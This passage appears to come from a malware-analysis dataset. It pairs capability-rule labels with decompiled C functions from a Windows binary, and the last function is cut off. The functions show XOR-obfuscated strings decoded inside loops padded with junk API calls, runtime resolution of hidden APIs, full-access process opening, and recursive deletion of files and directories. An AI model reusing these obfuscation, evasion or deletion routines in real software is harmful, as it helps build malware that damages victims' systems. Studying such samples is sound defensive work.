        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040ab33(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t hFindFile;\n    uint var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar7 = 8;\n    var_20h = 0x104;\n    var_34h = fcn.0040a6ff();\n    lpString2 = in_ECX;\n    if (var_34h != 0) {\n        lpString2 = var_34h;\n    }\n    var_1ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar1 = (*pcVar5)(8, var_1ch * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (var_14h != 0) {\n            uVar1 = (*pcVar5)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x4a66331e;\n                hFindFile = 0x4a663342;\n                var_2ch._0_2_ = 0x4952;\n                uVar1 = (*pcVar5)(8, 9);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_18h = 6;\n                iVar4 = 0;\n                var_28h = iVar7;\n                do {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar2 != 0x378537) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ (iVar4 + iVar7)[&var_ch - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar7);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_40h = 0x786f4137;\n                var_3ch = 0x41417767;\n                var_38h._0_2_ = 0x7845;\n                hFindFile = 0x7845416b;\n                var_2ch._0_2_ = 0x7749;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_24h = &var_40h - iVar7;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    iVar2 = var_14h;\n                    if (iVar3 != 0x38589e) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ *((&var_40h - iVar7) + iVar4 + iVar7);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar7);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar2, lpFindFileData);\n                iVar4 = var_28h;\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_18h = iVar2 + 2 + var_1ch;\n                            if (var_20h < var_18h) {\n                                uVar1 = (*pcVar5)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                uVar1 = (*pcVar5)(8, var_18h * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_18h;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar4);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_1ch * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040ab33(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar2 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar2 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar2 != 0);\n                }\n                uVar1 = (*pcVar5)(0, iVar7);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar4);\n                (*pcVar6)(uVar1);\n                uVar1 = (*pcVar5)(0, lpFindFileData);\n                (*pcVar6)(uVar1);\n                iVar7 = var_ch;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            (*pcVar6)(uVar1);\n        }\n        if (lpFileName != 0) {\n            uVar1 = (*pcVar5)(0, lpFileName);\n            (*pcVar6)(uVar1);\n        }\n    }\n    if (var_34h != 0) {\n        uVar1 = (*pcVar5)(0, var_34h);\n        (*pcVar6)(uVar1);\n    }\n    return iVar7;\n}\n",
        "token_count": 1784
    },
    "0040bcc5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040bcc5(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h._0_2_ = 0x210d;\n    var_4h = 6;\n    var_24h._2_1_ = 6;\n    stack0xffffffdb = 0x7401d55;\n    var_1dh._0_1_ = 0x39;\n    var_1dh._1_1_ = 0xe;\n    var_1dh._2_1_ = 0x39;\n    var_18h = 0x39625563;\n    var_14h._0_2_ = 0x6e71;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x14760223;\n    var_24h._0_2_ = 0x713;\n    var_24h._2_1_ = 0x29;\n    stack0xffffffdb = 0x13075607;\n    var_1dh._0_1_ = 0x1a;\n    var_1dh._1_1_ = 10;\n    var_1dh._2_1_ = 0x75;\n    var_18h = 0x64397579;\n    var_14h._0_2_ = 0x6976;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xc96aef) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 927
    },
    "0040be46": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040be46(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2dh;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040bdfd();\n    }\n    if (*0x41dda8 == NULL) {\n        var_34h._0_2_ = 0x210d;\n        var_8h = 6;\n        var_34h._2_1_ = 6;\n        stack0xffffffcb = 0x7401d55;\n        var_2dh._0_2_ = 0xe39;\n        var_2dh._2_1_ = 0x39;\n        var_20h = 0x39625563;\n        var_1ch._0_2_ = 0x6e71;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_10h = &var_34h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar4 != 0x7d2cca) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x1e043032;\n        var_4ch = 0x155c5416;\n        var_48h = 0x34051036;\n        var_44h = 0x4273501;\n        var_40h = 0x22250e00;\n        var_3ch = 0x1b131e3e;\n        var_38h._0_2_ = 0x735e;\n        var_38h._2_1_ = 0x53;\n        var_20h = 0x71534768;\n        var_1ch._0_2_ = 0x6261;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_10h = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0xaac036) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[&var_50h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41dda8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_28h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41dda8 == NULL) goto code_r0x0040bfea;\n    }\n    iVar3 = var_4h;\n    var_28h = 0;\n    iVar6 = (**0x41dda8)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x0040bfea:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1225
    },
    "0040c000": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c000(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    unkbyte3 var_44h;\n    uint var_41h;\n    uint var_34h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h._0_2_ = 0x210d;\n    var_10h = 0x6;\n    var_48h._2_1_ = 6;\n    stack0xffffffb7 = 0x7401d55;\n    var_41h._0_1_ = 0x39;\n    var_41h._1_1_ = 0xe;\n    var_41h._2_1_ = 0x39;\n    var_8h = 0x39625563;\n    var_4h._0_2_ = 0x6e71;\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_5ch = &var_48h - iVar4;\n    var_60h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar5 != 0x7d2cca) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_10h) ^ (iVar11 + iVar4)[var_5ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h._0_1_ = 0x29;\n    stack0xffffffca = 0x45442134;\n    var_34h._1_1_ = 1;\n    var_2ah._0_1_ = 1;\n    var_2eh = 0x563b3242;\n    stack0xffffffd3 = 0x55202a0f;\n    var_25h = 0x2f0e041c;\n    var_21h = 0xd191a47;\n    var_1dh = 0x151c411e;\n    var_19h._0_1_ = 6;\n    stack0xffffffe4 = 0x4245403d;\n    var_14h._0_1_ = 99;\n    var_8h = 0x4e637673;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x33);\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0x5;\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        iVar5 = var_60h;\n        if (iVar6 != 0x849ac1) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41e21c & 1) == 0) {\n        *0x41e21c = *0x41e21c | 1;\n        *0x41e218 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_60h);\n    }\n    if ((*0x41e21c & 2) == 0) {\n        *0x41e21c = *0x41e21c | 2;\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e218, iVar4);\n    }\n    if (*0x41e218 == 0) {\n        *0x41e218 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41e214 == NULL) {\n        var_34h._0_1_ = 0x29;\n        stack0xffffffca = 0x45442134;\n        var_34h._1_1_ = 1;\n        var_2ah._0_1_ = 1;\n        var_2eh = 0x563b3242;\n        stack0xffffffd3 = 0x55202a0f;\n        var_25h = 0x2f0e041c;\n        var_21h = 0xd191a47;\n        var_1dh = 0x151c411e;\n        var_19h._0_1_ = 6;\n        stack0xffffffe4 = 0x4245403d;\n        var_14h._0_1_ = 99;\n        var_8h = 0x4e637673;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x33);\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar5 != 0x849ac1) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e218, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_60h;\n        iVar4 = var_5ch;\n    }\n    fcn.0040b8cc();\n    if ((*0x41e214 != NULL) && (iVar11 = (**0x41e214)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.0040be46(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.0040be46(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_68h = *(iVar11 + 0x18) + 0x10;\n                var_41h._0_1_ = *(iVar11 + 0x3c) >> 0x18;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                iVar6 = *(iVar11 + 0x38);\n                var_48h._0_2_ = iVar6;\n                var_48h._2_1_ = iVar6 >> 0x10;\n                var_48h._3_1_ = iVar6 >> 0x18;\n                unique0x10000307 = CONCAT31(*(iVar11 + 0x3c), var_48h._3_1_);\n                var_50h = 4;\n                if ((iVar6 != var_68h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.0040be46(iVar11 + 0x68, 0x98);\n                        iVar5 = var_60h;\n                        iVar4 = var_5ch;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_48h._0_2_ = var_78h;\n                        var_48h._2_1_ = var_78h >> 0x10;\n                        var_50h = var_50h + 0x120;\n                        var_44h = var_74h;\n                        unique0x10000303 = CONCAT31(var_44h, var_78h >> 0x18);\n                        var_41h._0_1_ = var_74h >> 0x18;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.0040be46(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_68h) || (iVar5 = var_60h,  iVar4 = var_5ch,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_64h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_64h;\n}\n",
        "token_count": 3228
    },
    "0040c4dc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c4dc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_54h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uchar uStack69;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint8_t var_30h [3];\n    uint var_2dh;\n    int32_t var_28h;\n    uint var_24h;\n    uint8_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41ddb0 | *0x41ddb4) != 0) {\ncode_r0x0040c891:\n        var_ch = 0x41ddb0;\n        goto code_r0x0040c896;\n    }\n    var_34h._0_2_ = 0x210d;\n    var_1ch = 6;\n    var_34h._2_1_ = 6;\n    stack0xffffffcb = 0x7401d55;\n    var_2dh._0_1_ = 0x39;\n    var_2dh._1_1_ = 0xe;\n    var_2dh._2_1_ = 0x39;\n    var_28h = 0x39625563;\n    var_24h._0_2_ = 0x6e71;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_20h = var_30h + (-4 - iVar2);\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar6 + iVar2) = *(&var_28h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_20h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x57750210;\n    var_38h = 0x5c1a0941;\n    var_34h._0_2_ = 0x5046;\n    var_34h._2_1_ = 0x32;\n    stack0xffffffcb = 0x475a6601;\n    var_2dh._0_1_ = 0x2f;\n    var_2dh._1_1_ = 0x14;\n    var_2dh._2_1_ = 0x56;\n    var_2dh._3_1_ = 0x32;\n    var_28h = 0x3232754a;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x35);\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_20h = 0x5;\n    iVar6 = 0;\n    var_10h = &var_3ch - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        iVar3 = var_8h;\n        if (iVar4 != 0xc0f80) {\n            *(iVar6 + iVar2) = *(&var_28h + iVar6 % var_20h) ^ (iVar6 + iVar2)[var_10h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41ddb0 = fcn.0040c9e0(iVar2);\n    if (*0x41ddb0 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x0040c615:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_3ch = 0x3038252d;\n        var_38h = 0x3c187127;\n        var_34h._0_2_ = 0x301f;\n        var_34h._2_1_ = 0x2b;\n        stack0xffffffcb = 0x193a2346;\n        var_2dh._0_1_ = 0x30;\n        var_2dh._1_1_ = 0x32;\n        var_2dh._2_1_ = 0x56;\n        var_2dh._3_1_ = 0x77;\n        var_28h = 0x556b5277;\n        var_24h._0_2_ = 0x3253;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = &var_3ch - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar3 = var_8h;\n            if (iVar4 != 0xbcbe7f) {\n                *(iVar6 + iVar2) = *(&var_28h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41ddb8 = fcn.0040c9e0(iVar2);\n        iVar2 = var_14h;\n        if (*0x41ddb8 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_54h._0_2_ = 0xe0e;\n            var_54h._2_1_ = 5;\n            stack0xffffffab = 0x3d250124;\n            var_4dh = 0x170a3f1c;\n            var_49h = 0x3c1a3120;\n            var_45h = 0x541d1e2c;\n            stack0xffffffcb = stack0xffffffcb & 0xff | 0x48795400;\n            var_2dh._0_1_ = 0x45;\n            var_2dh._1_1_ = 0x71;\n            var_2dh._2_1_ = 0x73;\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_28h = &var_54h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*pcVar5)();\n                iVar3 = var_8h;\n                if (iVar4 != 0x1cfdb9) {\n                    *(iVar6 + iVar2) = var_30h[iVar6 % var_1ch] ^ (iVar6 + iVar2)[var_28h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41ddc0 = fcn.0040c9e0(iVar2);\n            iVar2 = var_14h;\n            if (*0x41ddc0 != 0) {\n                var_54h._0_2_ = 0xe14;\n                var_54h._2_1_ = 2;\n                stack0xffffffab = 0x92f1808;\n                var_4dh = 0x39100f01;\n                var_49h = 0x10353136;\n                var_45h = 0x93e0d2d;\n                uStack69 = 0x1b;\n                var_40h._0_1_ = 0x4e;\n                var_1ch = 0x6657794e;\n                var_18h._0_1_ = 0x75;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_28h = &var_54h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0xaac898) {\n                        *(iVar6 + iVar2) = *(&var_1ch + iVar6 % var_20h) ^ (iVar6 + iVar2)[var_28h];\n                    